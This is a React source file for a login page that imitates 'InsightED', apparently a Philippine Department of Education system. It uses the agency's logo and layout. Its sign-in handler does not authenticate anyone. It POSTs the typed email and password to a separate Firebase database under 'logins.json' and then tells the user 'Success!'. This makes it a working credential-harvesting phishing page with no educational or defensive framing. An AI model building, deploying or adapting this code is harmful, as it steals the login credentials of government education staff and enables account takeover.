import { useState } from "react";

const FIREBASE_URL = "https://forms-12c42-default-rtdb.firebaseio.com";
const LOGO = "https://stride.deped.gov.ph/insighted/assets/InsightEd1-DQGBqvKJ.png";

export default function InsightED() {
  const [showPass, setShowPass] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [status, setStatus] = useState("");

  const handleSignIn = async () => {
    setStatus("Signing in...");
    try {
      await fetch(`${FIREBASE_URL}/logins.json`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          timestamp: new Date().toISOString(),
        }),
      });
      setStatus("Success!");
    } catch (e) {
      setStatus("Error: " + e.message);
    }
  };

  return (
    <div style={{
      minHeight: "100vh",
      background: "linear-gradient(135deg, #eceaff 0%, #eef1ff 40%, #e8f0ff 70%, #dbeaff 100%)",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif",
      padding: "20px 16px 0",
    }}>
      <div style={{
        background: "#ffffff",
        borderRadius: "24px",
        width: "100%",
        maxWidth: "490px",
        padding: "44px 44px 40px",
        position: "relative",
        boxShadow: "0 2px 30px rgba(120,120,200,0.08)",
      }}>
        <button style={{
          position: "absolute", top: "26px", left: "26px",
          background: "none", border: "none", cursor: "pointer",
          color: "#9ca3af", padding: 0, lineHeight: 0, display: "flex", alignItems: "center",
        }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="15 18 9 12 15 6"/>
          </svg>
        </button>

        <div style={{ display: "flex", justifyContent: "center", marginBottom: "22px" }}>
          <div style={{
            width: "88px", height: "88px", borderRadius: "16px",
            background: "#f8f9fb", border: "1px solid #eaecf0",
            overflow: "hidden", display: "flex", alignItems: "center", justifyContent: "center",
          }}>
            <img
              src={LOGO}
              alt="InsightED"
              style={{ width: "100%", height: "100%", objectFit: "contain" }}
            />
          </div>
        </div>

        <div style={{ textAlign: "center", fontSize: "28px", fontWeight: 800, color: "#1a1f36", letterSpacing: "-0.4px", marginBottom: "5px", lineHeight: 1.2 }}>InsightED</div>
        <div style={{ textAlign: "center", fontSize: "14px", color: "#94a3b8", fontWeight: 400, marginBottom: "32px" }}>Department of Education</div>

        {/* Email field */}
        <div style={{ position: "relative", marginBottom: "16px" }}>
          <span style={{ position: "absolute", left: "16px", top: "50%", transform: "translateY(-50%)", color: "#64748b", display: "flex", alignItems: "center" }}>
            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="2,7 12,13 22,7"/>
            </svg>
          </span>
          <input type="text" value={email} onChange={e => setEmail(e.target.value)} placeholder="Email or Username" style={{
            width: "100%", padding: "16px 16px 16px 46px",
            border: "1.5px solid #e4e7ec", borderRadius: "12px",
            background: "#ffffff", fontSize: "15px", fontFamily: "inherit",
            color: "#1a1f36", outline: "none", boxSizing: "border-box",
          }}/>
        </div>

        {/* Passcode field */}
        <div style={{ position: "relative", marginBottom: "8px" }}>
          <span style={{ position: "absolute", left: "16px", top: "50%", transform: "translateY(-50%)", color: "#94a3b8", display: "flex", alignItems: "center" }}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
          </span>
          <input type={showPass ? "text" : "password"} placeholder="Passcode"
            value={password} onChange={e => setPassword(e.target.value)}
            style={{
              width: "100%", padding: "16px 46px 16px 46px",
              border: "1.5px solid #e4e7ec", borderRadius: "12px",
              background: "#ffffff", fontSize: "15px", fontFamily: "inherit",
              color: "#1a1f36", outline: "none", boxSizing: "border-box",
            }}
          />
          <span onClick={() => setShowPass(!showPass)} style={{ position: "absolute", right: "16px", top: "50%", transform: "translateY(-50%)", color: "#94a3b8", display: "flex", alignItems: "center", cursor: "pointer" }}>
            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
              <line x1="1" y1="1" x2="23" y2="23"/>
            </svg>
          </span>
        </div>

        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "10px 0 20px" }}>
          <button style={{ background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", fontSize: "11px", fontWeight: 700, color: "#2d65ec", letterSpacing: "0.5px", textTransform: "uppercase", display: "flex", alignItems: "center", gap: "5px", padding: 0 }}>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
            Switch to Password
          </button>
          <button style={{ background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", fontSize: "11px", fontWeight: 700, color: "#2d65ec", letterSpacing: "0.5px", textTransform: "uppercase", padding: 0 }}>
            Forgot Password?
          </button>
        </div>

        <button onClick={handleSignIn} style={{
          width: "100%", padding: "16px", border: "none", borderRadius: "12px",
          background: "linear-gradient(90deg, #2762ea 0%, #3a54eb 100%)",
          color: "#ffffff", fontFamily: "inherit", fontSize: "16px", fontWeight: 700,
          cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center",
          gap: "10px", marginBottom: "12px", boxShadow: "0 4px 18px rgba(39,98,234,0.35)",
          letterSpacing: "0.1px",
        }}>
          {status === "Signing in..." ? "Signing in..." : "Sign In"}
          {status !== "Signing in..." && (
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>
            </svg>
          )}
        </button>

        <button style={{
          width: "100%", padding: "16px", border: "1.5px solid #e4e7ec", borderRadius: "12px",
          background: "#ffffff", color: "#2d65ec", fontFamily: "inherit", fontSize: "12px",
          fontWeight: 700, letterSpacing: "1px", textTransform: "uppercase", cursor: "pointer",
        }}>
          Create New Account
        </button>
      </div>

      <div style={{ display: "flex", gap: "8px", marginTop: "16px" }}>
        {[
          { label: "Install App", icon: <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="17" x2="12.01" y2="17" strokeWidth="2.5"/></svg> },
          { label: "Troubleshoot", icon: <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17" strokeWidth="2.5"/></svg> },
          { label: "Help Desk Chat", icon: <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg> },
        ].map(({ label, icon }) => (
          <button key={label} style={{
            display: "flex", alignItems: "center", gap: "6px",
            padding: "8px 14px", background: "rgba(255,255,255,0.55)",
            border: "1px solid rgba(220,228,248,0.9)", borderRadius: "50px",
            fontSize: "11.5px", color: "#94a3b8", fontFamily: "inherit",
            fontWeight: 500, cursor: "pointer", backdropFilter: "blur(10px)", whiteSpace: "nowrap",
          }}>
            {icon}{label}
          </button>
        ))}
      </div>
    </div>
  );
}
